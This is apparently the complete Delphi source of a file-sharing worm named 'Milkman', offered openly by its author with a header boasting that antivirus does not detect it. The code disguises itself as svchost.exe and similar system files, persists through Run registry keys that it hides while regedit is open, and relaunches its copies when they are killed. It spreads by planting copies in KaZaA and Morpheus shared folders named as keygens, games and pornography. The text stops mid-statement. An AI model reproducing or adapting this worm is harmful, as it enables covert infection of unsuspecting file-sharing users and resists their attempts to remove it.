   {Name: Milkman }
   {Type: Multipartite <Combines Worm and Virus methods> }
   {Features: Memory Residency, Stealth }
   {Short Analysis: Milkman spreads via the sharing clients KaZaA,
   KaZaA Lite, and Morpheus. It is unique since without a means of
   transmission, it will basically commit suicide. If a means of
   transmission is found, Milkman goes through PreResidency checking
   then goes resident and continues 24/7 checking. If it is in any
   possible danger of 'extinction' it will vigorously attempt to
   recreate any files it has lost, it will literally battle the
   user to stay active. }
   {PayLoad: Milkman has no 'real' payload. If the victim is on a
   reasonably slow computer, Milkman may cause some performance
   problems. Otherwise, the victim is totally oblivious to Milkmans
   existance. }
   {Tested Systems: Windows XP -- Functionality on windows 95/95/ME/2000 may vary}
   {Compression: UPX }
   {Detected by AntiVirus: No }
   {AntiVirus by unfunf: Yes -- If you are infected with the virus,
   pm me on irc and I will give you the AntiVirus }
   {Disclaimer: I am not responsible for any damage caused by Milkman.
   It is for educational purposes only.}
   {Created by unfunf}
   program Milkman;

   uses Windows, TlHelp32, Forms, Registry, SysUtils, ShellAPI;

   function KillTask(ExeFileName: string): integer;
   const
    PROCESS_TERMINATE=$0001;
   var
    ContinueLoop: BOOL;
    FSnapshotHandle: THandle;
    FProcessEntry32: TProcessEntry32;
   begin
    result := 0;

    FSnapshotHandle := CreateToolhelp32Snapshot
                      (TH32CS_SNAPPROCESS, 0);
    FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
    ContinueLoop := Process32First(FSnapshotHandle,
                                  FProcessEntry32);

    while integer(ContinueLoop) <> 0 do
    begin
      if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
          UpperCase(ExeFileName))
      or (UpperCase(FProcessEntry32.szExeFile) =
          UpperCase(ExeFileName))) then
       Result := Integer(TerminateProcess(OpenProcess(
                         PROCESS_TERMINATE, BOOL(0),
                         FProcessEntry32.th32ProcessID), 0));
     ContinueLoop := Process32Next(FSnapshotHandle,
                                   FProcessEntry32);
   end;

    CloseHandle(FSnapshotHandle);
   end;

   procedure GoResident;
   var
    WormPath1, WormPath2, Root : String;
    RegGD, RegRMV, RegK, RegM : TRegistry;
    CTSIRs, CTSIRr32, CTSIRr : Integer;
   begin
    {Attempt to get root directory}
    RegGD := TRegistry.Create;
    RegGD.RootKey := HKEY_LOCAL_MACHINE;
    RegGD.Access := KEY_ALL_ACCESS;
    if RegGD.KeyExists('SOFTWARE\Microsoft\Windows\CurrentVersion\Setup') then
    begin
      RegGD.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\', false);
      if DirectoryExists(RegGD.ReadString('BootDir')) then
      begin
        Root := RegGD.ReadString('BootDir');
        MessageBox(0, PChar('Phase1 Test, Dir = ' + PChar(Root)), 'Test', mb_OK);
      end
      else
      begin
        Root := 'C:\';
      end;
    end
    else
    begin
      Root := 'C:\';
    end;
    {Check to see what OS the victim is using}
    if Win32Platform = 1 then
    begin
      {Set Worm Paths}
      WormPath1 := Root+'windows\cfgsystem.exe';
      WormPath2 := Root+'windows\tman95.exe';
      {The worm checks to make sure both of its copies are running,
       if one of the copies isn't running it reopens that copy.}
      CTSIRs := FindWindow('TApplication', 'cfgsystem.exe');
      CTSIRr32 := FindWindow('TApplication', 'tman95.exe');
      {The worm checks to see if regedit is opened... if it is, the
       worm will temporarily remove its registry entries, thus
       achieving registry stealth}
      CTSIRr := FindWindow('RegEdit_RegEdit', 'regedit.exe');
      if CTSIRs = 0 then
      begin
        ShellExecute(Application.Handle, 'Open', PChar(WormPath1), nil, nil, 0);
      end;
      if CTSIRr32 = 0 then
      begin
        ShellExecute(Application.Handle, 'Open', PChar(WormPath2), nil, nil, 0);
      end;
      {If registry is opened, hide from registry}
      if CTSIRr = 0 then
      begin
        RegRMV := TRegistry.Create;
        RegRMV.RootKey := HKEY_LOCAL_MACHINE;
        RegRMV.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\run\', false);
        RegRMV.Access := KEY_ALL_ACCESS;
        RegRMV.WriteString('Milkman', WormPath1);
        RegRMV.WriteString('Milkman32', WormPath2);
        RegRMV.CloseKey;
        RegRMV.Free;
      end;
      if CTSIRr = 1 then
      begin
        RegRMV := TRegistry.Create;
        RegRMV.RootKey := HKEY_LOCAL_MACHINE;
        RegRMV.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\run\', false);
        RegRMV.Access := KEY_ALL_ACCESS;
        RegRMV.DeleteKey('Milkman');
        RegRMV.DeleteKey('Milkman32');
        RegRMV.CloseKey;
        RegRMV.Free;
      end;
      {Start spread sequence}
      if FileExists(WormPath1) and FileExists(WormPath2) then
      begin
        RegK := TRegistry.Create;
        RegM := TRegistry.Create;
        RegK.RootKey := HKEY_CURRENT_USER;
        RegK.Access := KEY_ALL_ACCESS;
        RegM.RootKey := HKEY_LOCAL_MACHINE;
        RegM.Access := KEY_ALL_ACCESS;
        if RegK.KeyExists('Software\Kazaa\LocalContent') and RegM.KeyExists('SOFTWARE\Morpheus') then
        begin
          RegK.OpenKey('Software\Kazaa\LocalContent', false);
          RegM.OpenKey('SOFTWARE\Morpheus', false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Delphi 6 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 6 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\The Sims.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\CS keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\BF1942 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Porn Hotline.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Pornography.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Norton AntiVirus 2003 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Disturbed - Down with the Sickness.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Windows XP Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 7 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Delphi 6 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 6 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\The Sims.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\CS keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\BF1942 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Porn Hotline.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Pornography.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Norton AntiVirus 2003 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Disturbed - Down with the Sickness.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Windows XP Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 7 Keygen.exe'), false);
          RegM.CloseKey;
          RegK.CloseKey;
        end;
        if RegM.KeyExists('SOFTWARE\Morpheus') then
        begin
          RegM.OpenKey('SOFTWARE\Morpheus', false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Delphi 6 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 6 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\The Sims.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\CS keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\BF1942 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Porn Hotline.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Pornography.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Norton AntiVirus 2003 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Disturbed - Down with the Sickness.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Windows XP Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 7 Keygen.exe'), false);
          RegM.CloseKey;
        end;
        if RegK.KeyExists('Software\Kazaa\LocalContent') then
        begin
          RegK.OpenKey('Software\Kazaa\LocalContent', false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Delphi 6 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 6 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\The Sims.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\CS keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\BF1942 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Porn Hotline.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Pornography.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Norton AntiVirus 2003 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Disturbed - Down with the Sickness.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Windows XP Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 7 Keygen.exe'), false);
          RegK.CloseKey;
        end;
      end;
    if FileExists(WormPath1) then
    begin
      CopyFile(PChar(WormPath1), PChar(WormPath2), false);
    end;
    if FileExists(WormPath2) then
    begin
      CopyFile(PChar(WormPath2), PChar(WormPath1), false);
    end;
    end;
    {Check to see what OS the victim is using}
    if Win32Platform = 2 then
    begin
      WormPath1 := Root+'windows\system32\1039\svchost.exe';
      WormPath2 := Root+'windows\system32\reg32.exe';
      {The worm checks to make sure both of its copies are running,
       if one of the copies isn't running it reopens that copy.}
      CTSIRs := FindWindow('TApplication', 'svchost.exe');
      CTSIRr32 := FindWindow('TApplication', 'reg32.exe');
      {The worm checks to see if regedit is opened... if it is, the
       worm will temporarily remove its registry entries, thus
       achieving registry stealth}
      CTSIRr := FindWindow('RegEdit_RegEdit', 'regedit.exe');
      if CTSIRs = 0 then
      begin
        ShellExecute(Application.Handle, 'Open', PChar(WormPath1), nil, nil, 0);
      end;
      if CTSIRr32 = 0 then
      begin
        ShellExecute(Application.Handle, 'Open', PChar(WormPath2), nil, nil, 0);
      end;
      {If registry is opened, hide from registry}
      if CTSIRr = 0 then
      begin
        RegRMV := TRegistry.Create;
        RegRMV.RootKey := HKEY_LOCAL_MACHINE;
        RegRMV.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\run\', false);
        RegRMV.Access := KEY_ALL_ACCESS;
        RegRMV.WriteString('Milkman', WormPath1);
        RegRMV.WriteString('Milkman32', WormPath2);
        RegRMV.CloseKey;
        RegRMV.Free;
      end;
      if CTSIRr = 1 then
      begin
        RegRMV := TRegistry.Create;
        RegRMV.RootKey := HKEY_LOCAL_MACHINE;
        RegRMV.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\run\', false);
        RegRMV.Access := KEY_ALL_ACCESS;
        RegRMV.DeleteKey('Milkman');
        RegRMV.DeleteKey('Milkman32');
        RegRMV.CloseKey;
        RegRMV.Free;
      end;
      {Begin spread sequence}
      if FileExists(WormPath1) and FileExists(WormPath2) then
      begin
        RegK := TRegistry.Create;
        RegM := TRegistry.Create;
        RegK.RootKey := HKEY_CURRENT_USER;
        RegK.Access := KEY_ALL_ACCESS;
        RegM.RootKey := HKEY_LOCAL_MACHINE;
        RegM.Access := KEY_ALL_ACCESS;
        if RegK.KeyExists('Software\Kazaa\LocalContent') and RegM.KeyExists('SOFTWARE\Morpheus') then
        begin
          RegK.OpenKey('Software\Kazaa\LocalContent', false);
          RegM.OpenKey('SOFTWARE\Morpheus', false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Delphi 6 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 6 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\The Sims.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\CS keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\BF1942 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Porn Hotline.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Pornography.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Norton AntiVirus 2003 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Disturbed - Down with the Sickness.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Windows XP Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 7 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Delphi 6 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 6 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\The Sims.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\CS keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\BF1942 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Porn Hotline.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Pornography.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Norton AntiVirus 2003 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Disturbed - Down with the Sickness.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Windows XP Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 7 Keygen.exe'), false);
          RegM.CloseKey;
          RegK.CloseKey;
        end;
        if RegM.KeyExists('SOFTWARE\Morpheus') then
        begin
          RegM.OpenKey('SOFTWARE\Morpheus', false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Delphi 6 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 6 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\The Sims.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\CS keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\BF1942 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Porn Hotline.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Pornography.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Norton AntiVirus 2003 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Disturbed - Down with the Sickness.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Windows XP Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 7 Keygen.exe'), false);
          RegM.CloseKey;
        end;
        if RegK.KeyExists('Software\Kazaa\LocalContent') then
        begin
          RegK.OpenKey('Software\Kazaa\LocalContent', false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Delphi 6 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 6 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\The Sims.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\CS keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\BF1942 keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Porn Hotline.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Pornography.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Norton AntiVirus 2003 Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Disturbed - Down with the Sickness.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Windows XP Keygen.exe'), false);
          CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 7 Keygen.exe'), false);
          RegK.CloseKey;
        end;
      end;
    if FileExists(WormPath1) then
    begin
      CopyFile(PChar(WormPath1), PChar(WormPath2), false);
    end;
    if FileExists(WormPath2) then
    begin
      CopyFile(PChar(WormPath2), PChar(WormPath1), false);
    end;
    end;
   end;

   procedure PreResidency;
   VAR
     MSG : TMSG;
   begin
    WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
   end;


   procedure WormLoad;
   var
    WormPath1, WormPath2, Root: String;
    RegGD : TRegistry;
   begin
    {First, the worm will attempt to obtain the current directory...
     if the directory doesnt exist on the current computer setup
     the worm will make an educated guess and use the C:\ root}
    RegGD := TRegistry.Create;
    RegGD.RootKey := HKEY_LOCAL_MACHINE;
    RegGD.Access := KEY_ALL_ACCESS;
    if RegGD.KeyExists('SOFTWARE\Microsoft\Windows\CurrentVersion\Setup') then
    begin
      RegGD.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Setup\', false);
      if DirectoryExists(RegGD.ReadString('BootDir')) then
      begin
        Root := RegGD.ReadString('BootDir');
      end
      else
      begin
        Root := 'C:\';
      end;
    end
    else
    begin
      Root := 'C:\';
    end;
    begin
      {Check to see what OS the victim is using}
      if Win32Platform = 1 then
      begin
        {Set worm paths}
        WormPath1 := Root+'windows\cfgsystem.exe';
        WormPath2 := Root+'windows\tman95.exe';
        {Begin checking sequence}
        if FileExists(WormPath1) and FileExists(WormPath2) then
        begin
          if Application.ExeName <> WormPath1 then
          begin
            if Application.ExeName <> WormPath2 then
            ShellExecute(Application.Handle, 'Open', PChar(WormPath1), nil, nil, 0);
            ShellExecute(Application.Handle, 'Open', PChar(WormPath2), nil, nil, 0);
            ExitProcess(0);
          end
          else if Application.ExeName <> WormPath2 then
          begin
            if Application.ExeName <> WormPath1 then
            ShellExecute(Application.Handle, 'Open', PChar(WormPath2), nil, nil, 0);
            ShellExecute(Application.Handle, 'Open', PChar(WormPath1), nil, nil, 0);
            ExitProcess(0);
          end
          else
          begin
            PreResidency;
          end;
        end
        else
        begin
          MoveFile(PChar(Application.ExeName), PChar(WormPath1));
          CopyFile(PChar(WormPath1), PChar(WormPath2), false);
          WormLoad;
        end;
      end
      {Check to see what OS the victim is using}
      else if Win32Platform = 2 then
      begin
        {Set worm paths}
        WormPath1 := Root+'windows\system32\1039\svchost.exe';
        WormPath2 := Root+'windows\system32\reg32.exe';
        {Begin checking sequence}
        if DirectoryExists(Root+'windows\system32\1039') then
        begin
          if FileExists(WormPath1) and FileExists(WormPath2) then
          begin
            if Application.ExeName <> WormPath1 then
            begin
              if Application.ExeName <> WormPath2 then
              begin
                ShellExecute(Application.Handle, 'Open', PChar(WormPath1), nil, nil, 0);
                ShellExecute(Application.Handle, 'Open', PChar(WormPath2), nil, nil, 0);
                ExitProcess(0);
              end
              else
              begin
                PreResidency;
              end;
            end
            else if Application.ExeName <> WormPath2 then
            begin
              if Application.ExeName <> WormPath1 then
              begin
                ShellExecute(Application.Handle, 'Open', PChar(WormPath2), nil, nil, 0);
                ShellExecute(Application.Handle, 'Open', PChar(WormPath1), nil, nil, 0);
                ExitProcess(0);
              end
              else
              begin
                PreResidency;
              end;
            end
            else
            begin
            PreResidency;
            end;
          end
          else
          begin
            MoveFile(PChar(Application.ExeName), PChar(WormPath1));
            CopyFile(PChar(WormPath1), PChar(WormPath2), false);
            WormLoad;
          end;
        end
        else
        begin
          CreateDir('C:\windows\system32\1039');
          WormLoad;
        end;
      end
      else
      begin
        FatalAppExit(0, 'Your windows is not compatible with this program');
      end;
    end;
   end;


   {When executed, Milkman goes from the bottom up code wise, So
   Milkman starts here}
   var
    RegK, RegM : TRegistry;
   begin
    {Milkman will first check to see what means of transmission
     it has. If it has none, it will uninstall itself.}
    RegK := TRegistry.Create;
    RegM := TRegistry.Create;
    RegK.RootKey := HKEY_CURRENT_USER;
    RegK.Access := KEY_ALL_ACCESS;
    RegM.RootKey := HKEY_LOCAL_MACHINE;
    RegM.Access := KEY_ALL_ACCESS;
    if RegK.KeyExists('Software\Kazaa\LocalContent') and RegM.KeyExists('SOFTWARE\Morpheus') then
    begin
      RegK.OpenKey('Software\Kazaa\LocalContent', false);
      RegM.OpenKey('SOFTWARE\Morpheus', false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Delphi 6 keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 6 Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\The Sims.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\CS keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\BF1942 keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Porn Hotline.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Pornography.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Norton AntiVirus 2003 Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Disturbed - Down with the Sickness.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Windows XP Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 7 Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Delphi 6 keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 6 Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\The Sims.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\CS keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\BF1942 keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Porn Hotline.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Pornography.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Norton AntiVirus 2003 Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Disturbed - Down with the Sickness.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Windows XP Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 7 Keygen.exe'), false);
      RegM.CloseKey;
      RegK.CloseKey;
      WormLoad;
    end;
    if RegM.KeyExists('SOFTWARE\Morpheus') then
    begin
      RegM.OpenKey('SOFTWARE\Morpheus', false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Delphi 6 keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 6 Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\The Sims.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\CS keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\BF1942 keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Porn Hotline.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Pornography.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Norton AntiVirus 2003 Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Disturbed - Down with the Sickness.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Windows XP Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegM.ReadString('Install_Dir') + '\My Shared Folder\Visual Studio 7 Keygen.exe'), false);
      RegM.CloseKey;
      WormLoad;
    end;
    if RegK.KeyExists('Software\Kazaa\LocalContent') then
    begin
      RegK.OpenKey('Software\Kazaa\LocalContent', false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Delphi 6 keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\Visual Studio 6 Keygen.exe'), false);
      CopyFile(PChar(Application.ExeName), PChar(RegK.ReadString('DownloadDir') + '\The Sims.exe'), false);
